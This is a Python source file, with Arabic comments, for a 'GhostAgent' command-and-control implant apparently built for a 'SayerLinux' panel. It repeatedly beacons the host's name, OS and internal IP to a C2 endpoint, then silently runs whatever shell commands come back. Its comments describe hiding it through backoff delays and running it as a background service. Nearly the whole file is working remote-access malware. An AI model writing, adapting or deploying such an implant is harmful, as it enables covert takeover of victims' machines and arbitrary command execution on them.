import requests
import subprocess
import time
import platform
import os
import socket

# --- إعدادات الاتصال المركزية (تعدل لتناسب سيرفرك) ---
C2_URL = "http://127.0.0.1:5000/api/beacon" # عنوان لوحة التحكم الخاصة بـ SayerLinux
AGENT_ID = f"Ghost-{platform.node()}-{random.randint(100, 999)}" if 'random' in globals() else f"Ghost-{platform.node()}"
INTERVAL = 10 # مدة الانتظار بين كل "نبضة" (ثانية)

class GhostAgent:
    def __init__(self):
        self.id = AGENT_ID
        self.os = f"{platform.system()} {platform.release()}"
        self.ip = self._get_internal_ip()

    def _get_internal_ip(self):
        try:
            return socket.gethostbyname(socket.gethostname())
        except: return "127.0.0.1"

    def execute_command(self, command):
        """تنفيذ الأوامر المستلمة من SayerLinux وإعادة النتيجة"""
        try:
            # تنفيذ الأمر في خلفية النظام (Silent Execution)
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)
            return output.decode('utf-8')
        except subprocess.CalledProcessError as e:
            return f"Error: {e.output.decode('utf-8')}"
        except Exception as e:
            return f"Agent Error: {str(e)}"

    def run(self):
        print(f"[*] العميل الشبح نشط... المعرف: {self.id}")
        while True:
            try:
                # 1. إرسال "نبضة" (Beacon) للوحة التحكم
                payload = {
                    "id": self.id,
                    "os": self.os,
                    "ip": self.ip,
                    "status": "Active"
                }
                
                response = requests.post(C2_URL, json=payload, timeout=10)
                
                if response.status_code == 200:
                    data = response.json()
                    command = data.get("command")
                    
                    # 2. إذا وجد أمر ينتظر، قم بتنفيذه
                    if command and command != "whoami": # "whoami" هو الأمر الافتراضي للبقاء
                        print(f"[!] أمر مستلم: {command}")
                        result = self.execute_command(command)
                        
                        # (اختياري) إرسال النتيجة مرة أخرى للوحة التحكم في تحديث قادم
                        # requests.post(C2_URL + "/results", json={"id": self.id, "output": result})

            except Exception as e:
                # في حال فشل الاتصال (السيرفر مغلق)، انتظر فترة أطول للتخفي
                time.sleep(30)
                continue

            time.sleep(INTERVAL)

if __name__ == "__main__":
    # تشغيل العميل في الخلفية (اختياري: يمكن تحويله لخدمة في النظام)
    agent = GhostAgent()
    agent.run()